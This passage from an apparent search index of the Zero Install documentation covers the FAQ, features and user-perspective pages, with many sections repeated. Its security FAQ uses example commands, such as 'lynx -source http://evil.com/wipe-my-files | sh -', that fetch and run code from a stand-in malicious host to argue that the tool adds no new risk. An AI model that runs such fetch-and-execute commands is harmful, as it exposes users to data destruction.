time, since it might only download the documentation for a package when you click on Help, for example. With traditional systems, all the extras have to get installed with the main program because users can't install anything themselves later if they find they need it. What about people without Internet connections? You can use 0export to create a setup.sh self-extracting installation script for distribution on CDs. What about when resources move? Everything you've already accessed at least once will continue to work. Users trying software for the first time will find that it doesn't work due to broken links. This is not new, either. The download instructions for ROX-Filer tell users that they need to get GTK from www.gtk.org and libxml from www.xmlsoft.org. If those sites change their names, the download instructions will be broken. It really doesn't make any difference. As with the regular web, people can leave redirections to the new site. Also, if a feed can't be fetched from its main site, Zero Install will automatically try using a mirror service. Mirror services continue hosting feeds that are no longer available from their original sites. The 0install import command lets you import the feed from the new location, and 0store allows adding any archive to the cache (provided its message digest matches). Because Zero Install simply unpacks an archive when installing a package, anyone with that program cached can re-export it (e.g. using 0export ). Because Zero Install digests are over the package archive's contents (not the archive itself), the original GPG signature is still valid (and is also exported by 0export). The digest can also be checked against the one from the mirror server. Security questions How secure is this? About as secure as any system which ultimately involves running software written by people you don't know who live in far away countries. However, since the downloading is automatic, there are more chances for automatic checking (eg, verifying GPG signatures, etc): To be more precise, it has all the advantages of application directories (no install step, so no chance for anything to run as root). In addition, if two users try to run the same application, they both automatically get the same cached copy, whereas without this each would have to install a separate copy to their home directory, or one user has to trust the other user not to have modified his copy, and use that. See the security issues document for more information. Doesn't Zero Install make it easier to send users malicious software? Not really. True, you could email a user, telling them to run: $ 0launch http://evil.com/wipe-my-files But on the other hand, you could also send them an email telling them to type: $ lynx -source http://evil.com/wipe-my-files | sh - Both can do exactly the same amount of damage, but the second works on any system. If a user is prepared to run unknown software, they're going to do it with or without Zero Install. Zero Install helps with large, complicated programs with lots of dependencies, whereas your typical malicious program is only a few lines long, and doesn't benefit from it. But what about kernel bugs? Zero Install is still vulnerable then! Sometimes, bugs are found (and fixed) in the Linux kernel that allow any user to become root. For example, one was used to compromise some of Debian's servers. Couldn't a user access some software through Zero Install that took advantage of this bug to break an un-patched machine? Well, yes. But, as with the question above, they could do it just as easily without Zero Install (using wget, or just by typing the program in themselves). If your kernel is insecure, you have a problem with or without Zero Install. Developers How do I provide software using Zero Install? The main requirement is that the program doesn't use hard-coded paths. It should get resources from its own package relative to its own location (e.g. a shell script would use $(dirname $0)/mydata rather than /usr/share/myprog/mydata ). Resources in other packages should be found using environment variables ( $GAME_DATA/level1 rather than /usr/share/gamedata/level1 ). Many programs do this already. Once you have suitable binary, upload an archive of it onto your web-site in the normal manner. The most widely understood formats are .tar.gz and .tar.bz2 , but Zero Install can also extract from .zip files, and .rpm , .deb and .autopackage packages if the appropriate extraction program is available ( unzip , rpm2cpio , etc). Often, you don't need to do anything special for Zero Install and can just use your existing binary release. Finally, you need to write a short XML file describing your program, the versions of it that are available, how to get them, and what libraries they require. See the Packaging Guide for details. How do I install a library? You don't install libraries directly; instead, each program which depends on the library must specify this dependency in its XML feed. In this way, every program sees a version of the library with which it is compatible. The only programs which will \"see\" a 0install library are those programs which specify a dependency on it. Note: if the program does specify the dependency, and you just want to make it use a particular version of the library, see the next question... How can I run my own version of something, instead of downloading a released version? Let's say you want to run a Git (developer) version of Edit. Start by cloning Edit's Git repository, as normal: $ git clone git://repo.or.cz/rox-edit.git Edit Aside: If you don't have Git, just use Zero Install to get it: $ 0install add git http://0install.net/2008/3rd-party/git.xml Now, if you try to run it directly, it will probably complain that it can't find ROX-Lib (a library it needs): $ cd Edit $ ./AppRun *** This program needs ROX-Lib2 (version 1.19.14) to run. The required libraries are listed in the Edit.xml file, and you can run that using 0launch : $ 0launch Edit.xml [ edit runs ] Of course, you could do 0install add edit-git Edit.xml to make a command that runs this version easily. How can I register my own version under the original's URI? The answer to the last question showed how to run a local version of a program directly, using 0launch to fetch the libraries it needed. However, if you (or some other program) run Edit using the normal URI ( http://rox.sourceforge.net/2005/interfaces/Edit ), your version won't show up. To add it, use 0install add-feed : $ cd Edit $ 0install add-feed Edit.xml Feed 'Edit.xml': 1) Add as feed for 'http://rox.sourceforge.net/2005/interfaces/Edit' Enter a number, or CTRL-C to cancel [1]: Feed list for interface 'http://rox.sourceforge.net/2005/interfaces/Edit' is now: - /home/talex/rox/Edit/Edit.xml $ 0install select -g http://rox.sourceforge.net/2005/interfaces/Edit When the GUI opens, you should see your local feed listed: The new version will appear in the list of available versions, and will be selected if it's the newest one (which a fresh subversion checkout should be - the version normally ends in -post to indicate that it is not a released version): This is particularly useful for libraries, since they are always used by other programs rather than run directly. Is Linux binary compatibility good enough to share binaries between distributions? There are some problems in this area generally (not just with Zero Install). However, we have binaries for ROX-Filer and many other programs that work on all distributions, so it's certainly possible. Zero Install can help you create more compatible binaries by compiling against older versions of header files; see Easy GTK binary compatibility for an example.","title":"FAQ"},{"location":"faq/#general-questions","text":"What is it? Zero Install is a way to run software without an explicit installation step. This is easier ( install and run becomes just run ) and safer (installation doesn't happen as root). How many Zero Install packages are there? The public mirror site provides a list of feeds we know about. There are currently more than 500, although the quality varies. What are \"decentralised\" installation systems, and why are they important? See my essay on OSNews or, if you're in a hurry, just read the summary . Where does it install things to? By default, everything goes under ~/.cache/0install.net/ . If you enable system-wide sharing , then things go under /var/cache/0install.net/ instead. See File locations . If you want to know where a particular program is, you can use 0install show , e.g. $ 0install add rox-edit http://rox.sourceforge.net/2005/interfaces/Edit $ 0install show rox-edit - URI: http://rox.sourceforge.net/2005/interfaces/Edit Version: 2.2 Path: /home/me/.cache/0install.net/implementations/sha256=ba3b495324192bb6c3fc1a2d9af3db2ced997fc8ce3177f08c926bebafcf16b9 - URI: http://rox.sourceforge.net/2005/interfaces/ROX-Lib Version: 2.0.6 Path: /home/me/.cache/0install.net/implementations/sha256=ccefa7b1873926de15430341b912466929fbff8116b6d0ad67c4df6d0c06243e - URI: http://repo.roscidus.com/python/python Version: 2.7.8-3 Path: (package:deb:python2.7:2.7.8-3:x86_64) That said, you shouldn't ever need to know where things are cached. If you're relying on this for some reason, you're probably doing it wrong ;-) Isn't is really hard to run applications if you always have to type URIs for them? Yes. As with the web, that works but it's not the intended way to do it. Like the web, you have links to the URIs, and you use the links normally. For example, you can run 0install add to let you run programs quickly from the shell, or AddApp to create graphical launchers, for example. You could put a launcher on the desktop background, set a keyboard shortcut, or add it to your Start menu. A 'distribution' could be nothing more than a web page listing links to high quality software for a particular audience. How do you do integration (e.g., making a Start menu show all installed software)? Since there is no concept of software being 'installed' or 'not-installed', this is not required. The menu (or other launching device) simply shows applications that the user may want to run. They will be fetched on demand. The menu doesn't show installed software; rather, the 'installed' software is what the user has put on the menu. This can be done e.g. using the 0desktop command on Linux or the desktop integration feature on Windows. The new menu entry is independent of the program data though; removing the program from the cache doesn't remove the menu item (clicking on it would simply offer to download the program again). Isn't it wasteful for every program to bundle all its dependencies? Yes, but Zero Install doesn't do that. Everything is dynamically linked, just as in a traditional Linux system: you can publish a program on your web-site that links against a library on another web-site. When updates are available for a library, they are used by all programs using that library (except for programs which are incompatible with the new library version, which will continue using the older version, without preventing other programs from upgrading). However, see Export for methods to create such all-in-one bundles for distribution on CD. Why was it called the \"injector\"? The name came from Dependency Injection - see \"The scarily-named Injector\" for details. Now we just call it \"0install\". Wouldn't it be cool if you could install software just by clicking in a web page? It's a bit of a security risk. If you set up your browser to do this, then the author of any random web-site can try to trick you into clicking on some harmless-looking link. They may even be able to trigger the process without any action from you at all. Zero Install's confirmation dialogs should prevent it from actually getting installed, but: Even with confirmation boxes, web pages can still annoy users by opening thousands of them. You'd need some kind of popup-blocker type technology to stop that. The malicious web page gets to send arbitrary data of their choice to Zero Install. For example, they might try to exploit a buffer-overflow in GnuPG by sending malformed data. Zero Install should reject it, but it's safer if we don't even allow the process to start. If you do this, then your browser needs permission to run arbitrary programs, add items to your Start menu, etc. Given that the browser is one of the most at-risk components on your system, this doesn't sound like a good plan (although browsers are often configured this way at present). Therefore, we require you to drag the link to the installer to start the process. That way, if you weren't intending to install anything, then the process doesn't even start. As an added bonus, this lets you specify where on your desktop you want the launcher created. That said, if you want this anyway then there's an experimental Firefox Extension to do this. Will Zero Install conflict with my existing package manager? No. Zero Install only writes to its own cache directory. It is completely independent of your existing packaging system. If you install the same program using both systems, you'll get two copies on your system, but they will be kept separate. You can use this to test a newer version of a program without messing up your existing installation. Zero Install can use distribution packages to satisfy some dependencies (rather than downloading a new copy itself). This doesn't affect programs installed using the native packaging system at all. See Distribution Integration for details. Note: while installation won't cause problems, actually running a program might change something (for example, a newer version may automatically upgrade a configuration file to a format that the older version can't read). This is essentially the same situation as when you downgrade a package to a previous version using your normal package manager. How do I know you won't start charging for this service? I'm not providing a service. You distribute software by hosting some files on your own web server. The only centralised URLs are the default mirror site and the default GPG key information server, both of which are optional. The core software is all LGPL or GPL. What if something gets automatically removed from the cache while I'm up a mountain with my laptop? Currently, nothing is ever automatically removed from the cache. Users can choose the purging scheme that suits them. For users with broadband, that might mean removing anything that hasn't been accessed for a year. For users with dial-up and 80Gb disks, that probably means never ever removing anything. You can click on the Cache button to view the cache and remove versions of programs you don't need anymore: You can also just delete things from the ~/.cache/0install.net directory directly, but it's easier using the GUI. What happens if there are two programs which may not be run simultaneously for some reason? Running and installing are separate. In Debian, for example, installing some software (eg, exim) may also cause it to run, but in zero install there is no install step, only the running step. So, you can 'install' any number of conflicting packages, but you can still only run one mail system at once. Can upstream authors really be trusted to provide decent quality software? Traditionally, a lot of the QA work that goes on in open source software is done by distributions (such as Debian). They take the `upstream' code from the software authors, and then provide a packaged version to their users. There are then two classes of bugs to worry about: upstream bugs and packaging bugs. Since it's not usually clear to users which bugs are in which category, they tend to report all bugs to the packagers, who often then fix even upstream bugs in their own packages. The effect of this is that distribution-provided packages are often more reliable than upstream ones (since upstream don't get to hear about many of the bugs), and different distributions have fixed different bugs, with no coordination between them. With Zero Install, bugs get fixed upstream. So, the 'Debian developer' who currently fixes Gimp bugs would still do the same job, but as a 'Gimp developer' instead. Thus, the fixes would benefit everyone, not just Debian users. Of course, the other reason why packages may be different to the upstream versions is because upstream is slow to respond, uninterested, or known to be careless about quality. In this case, a Zero Install packager can provide a fixed version from their own site and get other people to link to that. The advantage here is that, again, everyone benefits, not just users of one distribution. Does this replace /etc , /var , /tmp , etc? No. Zero Install is read-only, so you couldn't store configuration, data or temporary files in it, even if you wanted to. It replaces /usr and /opt . It's sensible to keep the other things separate, because they need to be treated differently: /etc : Contains system configuration. Should be backed up, and probably kept under version control too. May be mounted read-only most of the time. /home : User data. Must be writable, and often changes. Should be backed up regularly. /var : Changes quickly (contains print and mail queues, logs, etc). Must be writable. Doesn't need to be backed up, but data should persist over reboots. Zero Install cache is stored here; if lost it will just prompt you to download the programs again when you run them. /tmp : Changes quickly and must be writable, but need not persist over reboots (can use tmpfs rather than a physical disk). What was the inspiration for Zero Install? Several things. CODA and wwwoffle for showing that caching network filesystems can still work when off-line. The W3C for using URIs for namespaces. Not Java Web Start , Konvalo, D. J. Bernstein's slashpackage or The Open Software Description Format (OSD) though, because I had never heard of them when I started the project. What's the relationship between the 0install and 0launch commands? 0launch is older. It was originally intended to be used just for running things, but we ended up adding a load of other options to it (e.g. 0launch --import ) and it got a bit messy. 0install provides a cleaner, newer interface using sub-commands. 0launch URI is equivalent to 0install run URI . In general, using 0launch as anything other than a short form of 0install run is deprecated and you should use 0install instead.","title":"General questions"},{"location":"faq/#network-questions","text":"Isn't fetching stuff over the web really slow? You have to get stuff over the web anyway the first time. The system caches everything, and you can run the software in future without needing a network connection. Doesn't it require a fast Internet connection? No more than downloading programs from the Internet normally. However, it can still save you some time, since it might only download the documentation for a package when you click on Help, for example. With traditional systems, all the extras have to get installed with the main program because users can't install anything themselves later if they find they need it. What about people without Internet connections? You can use 0export to create a setup.sh self-extracting installation script for distribution on CDs. What about when resources move? Everything you've already accessed at least once will continue to work. Users trying software for the first time will find that it doesn't work due to broken links. This is not new, either. The download instructions for ROX-Filer tell users that they need to get GTK from www.gtk.org and libxml from www.xmlsoft.org. If those sites change their names, the download instructions will be broken. It really doesn't make any difference. As with the regular web, people can leave redirections to the new site. Also, if a feed can't be fetched from its main site, Zero Install will automatically try using a mirror service. Mirror services continue hosting feeds that are no longer available from their original sites. The 0install import command lets you import the feed from the new location, and 0store allows adding any archive to the cache (provided its message digest matches). Because Zero Install simply unpacks an archive when installing a package, anyone with that program cached can re-export it (e.g. using 0export ). Because Zero Install digests are over the package archive's contents (not the archive itself), the original GPG signature is still valid (and is also exported by 0export). The digest can also be checked against the one from the mirror server.","title":"Network questions"},{"location":"faq/#security-questions","text":"How secure is this? About as secure as any system which ultimately involves running software written by people you don't know who live in far away countries. However, since the downloading is automatic, there are more chances for automatic checking (eg, verifying GPG signatures, etc): To be more precise, it has all the advantages of application directories (no install step, so no chance for anything to run as root). In addition, if two users try to run the same application, they both automatically get the same cached copy, whereas without this each would have to install a separate copy to their home directory, or one user has to trust the other user not to have modified his copy, and use that. See the security issues document for more information. Doesn't Zero Install make it easier to send users malicious software? Not really. True, you could email a user, telling them to run: $ 0launch http://evil.com/wipe-my-files But on the other hand, you could also send them an email telling them to type: $ lynx -source http://evil.com/wipe-my-files | sh - Both can do exactly the same amount of damage, but the second works on any system. If a user is prepared to run unknown software, they're going to do it with or without Zero Install. Zero Install helps with large, complicated programs with lots of dependencies, whereas your typical malicious program is only a few lines long, and doesn't benefit from it. But what about kernel bugs? Zero Install is still vulnerable then! Sometimes, bugs are found (and fixed) in the Linux kernel that allow any user to become root. For example, one was used to compromise some of Debian's servers. Couldn't a user access some software through Zero Install that took advantage of this bug to break an un-patched machine? Well, yes. But, as with the question above, they could do it just as easily without Zero Install (using wget, or just by typing the program in themselves). If your kernel is insecure, you have a problem with or without Zero Install.","title":"Security questions"},{"location":"faq/#developers","text":"How do I provide software using Zero Install? The main requirement is that the program doesn't use hard-coded paths. It should get resources from its own package relative to its own location (e.g. a shell script would use $(dirname $0)/mydata rather than /usr/share/myprog/mydata ). Resources in other packages should be found using environment variables ( $GAME_DATA/level1 rather than /usr/share/gamedata/level1 ). Many programs do this already. Once you have suitable binary, upload an archive of it onto your web-site in the normal manner. The most widely understood formats are .tar.gz and .tar.bz2 , but Zero Install can also extract from .zip files, and .rpm , .deb and .autopackage packages if the appropriate extraction program is available ( unzip , rpm2cpio , etc). Often, you don't need to do anything special for Zero Install and can just use your existing binary release. Finally, you need to write a short XML file describing your program, the versions of it that are available, how to get them, and what libraries they require. See the Packaging Guide for details. How do I install a library? You don't install libraries directly; instead, each program which depends on the library must specify this dependency in its XML feed. In this way, every program sees a version of the library with which it is compatible. The only programs which will \"see\" a 0install library are those programs which specify a dependency on it. Note: if the program does specify the dependency, and you just want to make it use a particular version of the library, see the next question... How can I run my own version of something, instead of downloading a released version? Let's say you want to run a Git (developer) version of Edit. Start by cloning Edit's Git repository, as normal: $ git clone git://repo.or.cz/rox-edit.git Edit Aside: If you don't have Git, just use Zero Install to get it: $ 0install add git http://0install.net/2008/3rd-party/git.xml Now, if you try to run it directly, it will probably complain that it can't find ROX-Lib (a library it needs): $ cd Edit $ ./AppRun *** This program needs ROX-Lib2 (version 1.19.14) to run. The required libraries are listed in the Edit.xml file, and you can run that using 0launch : $ 0launch Edit.xml [ edit runs ] Of course, you could do 0install add edit-git Edit.xml to make a command that runs this version easily. How can I register my own version under the original's URI? The answer to the last question showed how to run a local version of a program directly, using 0launch to fetch the libraries it needed. However, if you (or some other program) run Edit using the normal URI ( http://rox.sourceforge.net/2005/interfaces/Edit ), your version won't show up. To add it, use 0install add-feed : $ cd Edit $ 0install add-feed Edit.xml Feed 'Edit.xml': 1) Add as feed for 'http://rox.sourceforge.net/2005/interfaces/Edit' Enter a number, or CTRL-C to cancel [1]: Feed list for interface 'http://rox.sourceforge.net/2005/interfaces/Edit' is now: - /home/talex/rox/Edit/Edit.xml $ 0install select -g http://rox.sourceforge.net/2005/interfaces/Edit When the GUI opens, you should see your local feed listed: The new version will appear in the list of available versions, and will be selected if it's the newest one (which a fresh subversion checkout should be - the version normally ends in -post to indicate that it is not a released version): This is particularly useful for libraries, since they are always used by other programs rather than run directly. Is Linux binary compatibility good enough to share binaries between distributions? There are some problems in this area generally (not just with Zero Install). However, we have binaries for ROX-Filer and many other programs that work on all distributions, so it's certainly possible. Zero Install can help you create more compatible binaries by compiling against older versions of header files; see Easy GTK binary compatibility for an example.","title":"Developers"},{"location":"features/","text":"Features Decentralised; anyone can distribute software The traditional Linux distribution system, using centralised repositories, creates an interesting chicken-and-egg situation: distributions won't package software until it becomes popular, but software won't become popular until it's easy to install. You don't need to be blessed by a distribution (or anyone else) to be part of 0install; all you need is a web page. It's easier too: you can make a single archive that works on all platforms (for platform-independent applications such as Python or Java programs), or have 0install download the correct archive automatically (for platform-specific binaries). See the \" Decentralised Installation Systems \" essay on OSNews for a more complete introduction to the subject. See the Packaging Guide for information on distributing software using 0install. Security is central Security is sometimes seen as the enemy of usability, but we see it as the foundation of a usable system. Good security doesn't just mean not having your data destroyed by viruses - it means freedom to experiment with new software. The problems with a centrally-controlled \"app store\" as the only means to get software are clear to everyone: applications that compete with the store owner's interests are banned. Innovation and competition suffer. But the same effect can be achieved without overt restrictions if getting software from outside the distribution repository is simply too risky for users to consider. See the security page for more information about 0install's security features. You control your own computer When you install a package with a traditional installer, you have no way of knowing what it will do. Will it add itself to a menu somewhere? Start a service whenever you turn on the computer? Stop another program from working? 0install merely caches programs, each version of each package in its own directory. Changes to the environment, such as adding a menu entry, only happen in response to a deliberate action on your part. Conflict free If two programs want the same version of a library, they'll share it. Otherwise, they'll use separate copies. You're free to try the very latest development version of a program (along with all the bleeding-edge libraries it needs) without destabilising the rest of your system. And you can always revert back to an older version... or run old and new versions of the same program side-by-side! Shared binaries/cache 0install supports sharing of binaries (the implementation cache) between users and between virtual machines . If one user installs a 200 Mb application, another user can run it without downloading it again. Most packaging systems solve this problem by only allowing root to install software. The systems which don't have this limitation typically end up downloading and storing multiple copies of a program; one for each user. 0install shares downloads (safely) between users. With 0install, each user downloads a small feed file which gives the cryptographic digest of the full package. The digest can be used to check that a package already on the computer (downloaded by another user) hasn't been tampered with. Most simply, each user can make a copy of the original download this way (which shares the download but not the disk space). With a special helper, even the disk copies can be safely shared. Cross-Platform and Cross-Distribution A single 0install package can be used across multiple Linux distributions, OS X, Unix and Windows systems (given that the packaged application itself is written to be cross-platform as well). Automatic updates When you run a program and it has been a month since the last check, 0install will quietly check for updates in the background. If any are available, you will be notified. The frequency of these checks is configurable, and you can choose not to use the latest version if you prefer. Binary and source packages 0install supports both compiling applications from source and downloading binaries. Native package manager integration If you have already installed a package using your distribution's installer then 0install can use that instead of downloading a second copy. It can also use use PackageKit to install system packages using the distribution's package manager, if no 0install package is available. See the distro integration page for more information. Run without granting root privileges When installing a package, most installation systems execute pre- and post-install scripts inside the package as root, giving the package full access to your machine. Even if they didn't, the fact that the package can unpack files to directories such as /usr/bin or /usr/lib effectively gives them root access anyway. By contrast, when 0install installs (caches) a package, it does not run any code from the package and it does not write to any of the traditional software directories like /usr/bin or /usr/lib . Instead it simply puts each unpacked archive into its own directory. Run without being root Since installing software with 0install does not allow it to affect the system as a whole, there is no need to restrict it to users with root privileges. Therefore, there is no need to give users root privileges just so that they can install software.","title":"Features"},{"location":"features/#features","text":"Decentralised; anyone can distribute software The traditional Linux distribution system, using centralised repositories, creates an interesting chicken-and-egg situation: distributions won't package software until it becomes popular, but software won't become popular until it's easy to install. You don't need to be blessed by a distribution (or anyone else) to be part of 0install; all you need is a web page. It's easier too: you can make a single archive that works on all platforms (for platform-independent applications such as Python or Java programs), or have 0install download the correct archive automatically (for platform-specific binaries). See the \" Decentralised Installation Systems \" essay on OSNews for a more complete introduction to the subject. See the Packaging Guide for information on distributing software using 0install. Security is central Security is sometimes seen as the enemy of usability, but we see it as the foundation of a usable system. Good security doesn't just mean not having your data destroyed by viruses - it means freedom to experiment with new software. The problems with a centrally-controlled \"app store\" as the only means to get software are clear to everyone: applications that compete with the store owner's interests are banned. Innovation and competition suffer. But the same effect can be achieved without overt restrictions if getting software from outside the distribution repository is simply too risky for users to consider. See the security page for more information about 0install's security features. You control your own computer When you install a package with a traditional installer, you have no way of knowing what it will do. Will it add itself to a menu somewhere? Start a service whenever you turn on the computer? Stop another program from working? 0install merely caches programs, each version of each package in its own directory. Changes to the environment, such as adding a menu entry, only happen in response to a deliberate action on your part. Conflict free If two programs want the same version of a library, they'll share it. Otherwise, they'll use separate copies. You're free to try the very latest development version of a program (along with all the bleeding-edge libraries it needs) without destabilising the rest of your system. And you can always revert back to an older version... or run old and new versions of the same program side-by-side! Shared binaries/cache 0install supports sharing of binaries (the implementation cache) between users and between virtual machines . If one user installs a 200 Mb application, another user can run it without downloading it again. Most packaging systems solve this problem by only allowing root to install software. The systems which don't have this limitation typically end up downloading and storing multiple copies of a program; one for each user. 0install shares downloads (safely) between users. With 0install, each user downloads a small feed file which gives the cryptographic digest of the full package. The digest can be used to check that a package already on the computer (downloaded by another user) hasn't been tampered with. Most simply, each user can make a copy of the original download this way (which shares the download but not the disk space). With a special helper, even the disk copies can be safely shared. Cross-Platform and Cross-Distribution A single 0install package can be used across multiple Linux distributions, OS X, Unix and Windows systems (given that the packaged application itself is written to be cross-platform as well). Automatic updates When you run a program and it has been a month since the last check, 0install will quietly check for updates in the background. If any are available, you will be notified. The frequency of these checks is configurable, and you can choose not to use the latest version if you prefer. Binary and source packages 0install supports both compiling applications from source and downloading binaries. Native package manager integration If you have already installed a package using your distribution's installer then 0install can use that instead of downloading a second copy. It can also use use PackageKit to install system packages using the distribution's package manager, if no 0install package is available. See the distro integration page for more information. Run without granting root privileges When installing a package, most installation systems execute pre- and post-install scripts inside the package as root, giving the package full access to your machine. Even if they didn't, the fact that the package can unpack files to directories such as /usr/bin or /usr/lib effectively gives them root access anyway. By contrast, when 0install installs (caches) a package, it does not run any code from the package and it does not write to any of the traditional software directories like /usr/bin or /usr/lib . Instead it simply puts each unpacked archive into its own directory. Run without being root Since installing software with 0install does not allow it to affect the system as a whole, there is no need to restrict it to users with root privileges. Therefore, there is no need to give users root privileges just so that they can install software.","title":"Features"},{"location":"perspectives/","text":"Depending on who you are, you'll be interested in different aspects of Zero Install. Choose the type below that most closely describes you: Novice user Power user System administrator Software developer Distribution maintainer Novice user Linux distributions come with a lot of general purpose software, but sometimes a program you want isn't there. Maybe it's very new, or very specialised. Zero Install makes it easy for you to use extra software, but only if someone has gone to the trouble of making it available this way. You can get packages from anywhere, not just from your distribution. On the other hand, there's no guarantee that these packages are any good. Be careful. You don't need to enter the root password to install things. Installing programs only affects you, not other users of the computer. If you know the program you want is available this way, go to the downloads page and install the Zero Install package for your distribution. If you don't have a particular package in mind and you're just browsing, then you've probably come to the wrong place. Only a small number of programs are currently available this way, and we're mainly interested in building the tools that help other people to make packages rather than in making lots of packages ourselves. Power user Power users are probably the ideal audience for Zero Install. Zero Install is all about putting you in control of your computer: You can get packages from anywhere, not just from your distribution. When installing a package, the package can't change your configuration. Packages can't add anything to your boot sequence, for example. Of course, actually running them might do bad things. But Zero Install makes it easy to share programs and libraries between sandboxes. You can upgrade to the latest testing version, or roll back to any previous version of any program or library. You can download binaries or compile from source. How do I ... ... get started? Go to the downloads page and install the Zero Install Injector package. Then follow the tutorial. ... change to a different version of something? Different desktop environments provide different ways to do this, but you can always use the command line. 0launch --list shows the URI of every program in your cache. 0launch -g URI opens the GUI for selecting different versions of that program. ... compile from source? Open the GUI (see above), right click on the program or library to compile and choose Compile... from the menu. See the 0compile page for details. ... reinstall something? You should never need to reinstall anything. Zero Install puts each package in a read-only cache directory, indexed by a cryptographic digest of the contents. Therefore, reinstalling is guaranteed to have no effect! If you think the cache has got corrupted somehow, you can run 0store audit to check it. Deleting the program's configuration files may help, though. System administrator Your users want you to install all kinds of odd programs for them, but you know that installing a bad package for one user could mess up all your other users. It's a tough choice. You either risk it, or tell them to install the program in their home directory. But that's hard work for them, and it wastes your disk space and network bandwidth if several users want the same program. Also, they never remember to check for updates. Zero Install lets your users install programs in a way that's as secure as installing to their home directories, but is easier, allows sharing between users and makes it easy for them to get automatic updates. How do I ... ... get started? Go to the downloads page and install the Zero Install Injector package. Your users can now install programs to their home directories easily. ... set up sharing of downloads? Follow the setting up sharing instructions . Now when a user installs a program, it ends up in /var/cache/0install.net (the sharing instructions explain why this is safe). ... add programs to everyone's desktop? You can add launchers to $PATH using 0install add , and you can add menu entries using 0desktop . Put the scripts or .desktop files in a common directory, just as with any other program. You should set up sharing before doing this, or every user will have to download a separate copy of the program. ... limit which programs can be installed? This is not yet supported. Talk to us! Software developer You don't have much free time, and you want to spend as much of it as possible writing code, not hanging around on distribution mailing lists and IRC channels trying to find someone to review the dozens of packages you've had to create. Life's too short for that. Creating a Zero Install feed for your programs is easy (it's essentially the same information about download locations and dependencies you would put on your web-page anyway, but in a machine-readable form). Then anyone with Zero Install can use your program. Create one package that works everywhere, not one package per Linux distribution. No need to be approved by a distribution before people can start using your programs. Specify dependencies in a distribution-neutral format. Use dependencies which aren't available in all distributions. Provide new versions immediately. No more waiting six months for the distribution's next release before you can get a fix out. How do I ... ... create a feed for my program? Follow the Packaging Guide . ... push updates to my users? Users poll for updates (as with RSS), by default once a month. You should initially mark new releases as 'testing' so that only more advanced users (who know how to roll back to previous versions if something goes wrong) get them. ... check that my feed is OK? Use FeedLint to test it. Distribution maintainer Installing anything that's not in your distribution is too hard for most of your users, so you've had to package up thousands of programs with minimal testing. Keeping on top of security updates and new releases is taking up all your time, and release testing drags on for months as you try to find a set of versions that supports all packages simultaneously. Instead of doing everything yourself, let the upstream maintainers do most of the work for you. They'll create packages, test them, provide updates and deal with bug reports. Unless you actually want to change something, you don't need to do anything. Dependencies are resolved on a per-program basis. If two programs can use the same version of a library then that's great; they'll share it. If not, then two copies of the library will co-exist. This is all automatic. How do I ... ... override a package's default configuration? Put your defaults in /etc as normal and the package should pick them up (though it depends on the program, of course). ... override a dependency of a Zero Install package to use my custom packaged library? You can register an additional feed in /usr/share/0install.net . See Distribution Integration for details. ... suggest suitable Zero Install packages for my users? See the instructions for administrators above. You just provide launchers. Each program will get installed when the first user runs it. ... sign off upstream versions I've tested? This is not yet supported. Talk to us! In general, we welcome better integration with distributions, so write to our mailing list and we'll work something out!","title":"Perspectives"},{"location":"perspectives/#novice-user","text":"Linux distributions come with a lot of general purpose software, but sometimes a program you want isn't there. Maybe it's very new, or very specialised. Zero Install makes it easy for you to use extra software, but only if someone has gone to the trouble of making it available this way. You can get packages from anywhere, not just from your distribution. On the other hand, there's no guarantee that these packages are any good. Be careful. You don't need to enter the root password to install things. Installing programs only affects you, not other users of the computer. If you know the program you want is available this way, go to the downloads page and install the Zero Install package for your distribution. If you don't have a particular package in mind and you're just browsing, then you've probably come to the wrong place. Only a small number of programs are currently available this way, and we're mainly interested in building the tools that help other people to make packages rather than in making lots of packages ourselves.","title":"Novice user"},{"location":"perspectives/#power-user","text":"Power users are probably the ideal audience for Zero Install. Zero Install is all about putting you in control of your computer: You can get packages from anywhere, not just from your distribution. When installing a package, the package can't change your configuration. Packages can't add anything to your boot sequence, for example. Of course, actually running them might do bad things. But Zero Install makes it easy to share programs and libraries between sandboxes. You can upgrade to the latest testing version, or roll back to any previous version of any program or library. You can download binaries or compile from source. How do I ... ... get started? Go to the downloads page and install the Zero Install Injector package. Then follow the tutorial. ... change to a different version of something? Different desktop environments provide different ways to do this, but you can always use the command line. 0launch --list shows the URI of every program in your cache. 0launch -g URI opens the GUI for selecting different versions of that program. ... compile from source? Open the GUI (see above), right click on the program or library to compile and choose Compile... from the menu. See the 0compile page for details. ... reinstall something? You should never need to reinstall anything. Zero Install puts each package in a read-only cache directory, indexed by a cryptographic digest of the contents. Therefore, reinstalling is guaranteed to have no effect! If you think the cache has got corrupted somehow, you can run 0store audit to check it. Deleting the program's configuration files may help, though.","title":"Power user"},{"location":"perspectives/#system-administrator","text":"Your users want you to install all kinds of odd programs for them, but you know that installing a bad package for one user could mess up all your other users. It's a tough choice. You either risk it, or tell them to install the program in their home directory. But that's hard work for them, and it wastes your disk space and network bandwidth if several users want the same program. Also, they never remember to check for updates. Zero Install lets your users install programs in a way that's as secure as installing to their home directories, but is easier, allows sharing between users and makes it easy for them to get automatic updates. How do I ... ... get started? Go to the downloads page and install the Zero Install Injector package. Your users can now install programs to their home directories easily. ... set up sharing of downloads? Follow the setting up sharing instructions . Now when a user installs a program, it ends up in /var/cache/0install.net (the sharing instructions explain why this is safe). ... add programs to everyone's desktop? You can add launchers to $PATH using 0install add , and you can add menu entries using 0desktop . Put the scripts or .desktop files in a common directory, just as with any other program. You should set up sharing before doing this, or every user will have to download a separate copy of the program. ... limit which programs can be installed? This is not yet supported. Talk to us!","title":"System administrator"},{"location":"perspectives/#software-developer","text":"You don't have much free time, and you want to spend as much of it as possible writing code, not hanging around on distribution mailing lists and IRC channels trying to find someone to review the dozens of packages you've had to create. Life's too short for that. Creating a Zero Install feed for your programs is easy (it's essentially the same information about download locations and dependencies you would put on your web-page anyway, but in a machine-readable form). Then anyone with Zero Install can use your program. Create one package that works everywhere, not one package per Linux distribution. No need to be approved by a distribution before people can start using your programs. Specify dependencies in a distribution-neutral format. Use dependencies which aren't available in all distributions. Provide new versions immediately. No more waiting six months for the distribution's next release before you can get a fix out. How do I ... ... create a feed for my program? Follow the Packaging Guide . ... push updates to my users? Users poll for updates (as with RSS), by default once a month. You should initially mark new releases as 'testing' so that only more advanced users (who know how to roll back to previous versions if something goes wrong) get them. ... check that my feed is OK? Use FeedLint to test it.","title":"Software developer"},{"location":"perspectives/#distribution-maintainer","text":"Installing anything that's not in your distribution is too hard for most of your users, so you've had to package up thousands of programs with minimal testing. Keeping on top of security updates and new releases is taking up all your time, and release testing drags on for months as you try to find a set of versions that supports all packages simultaneously. Instead of doing everything 